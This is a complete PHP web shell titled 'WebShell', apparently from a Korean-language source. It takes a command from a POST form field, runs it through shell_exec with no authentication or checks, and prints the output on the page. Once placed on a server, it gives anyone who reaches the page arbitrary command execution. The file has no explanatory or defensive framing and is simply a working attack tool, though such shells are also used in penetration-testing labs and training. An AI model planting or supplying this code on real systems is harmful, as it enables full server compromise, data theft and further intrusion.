<? 
$cmd = $_POST['cmd'];
$page = $_SERVER['PHP_SELF'];

if(!empty($cmd))
{
	$result = shell_exec($cmd);
}
?>
<html>
<head><title>WebShell</title></head>
<body>
 <form action='<?=$page?>' method='post'>
  <input type='txt' name='cmd'>
  <input type='submit' value='실행'>
</form>
<hr>
<table style='borad: 1px solid black; background-color: black'>
<tr>
<td style='color: white; font-size: 12px'>
 <?=$result?>
</td>
</tr>
</table>
</hr>
</body>
</html>
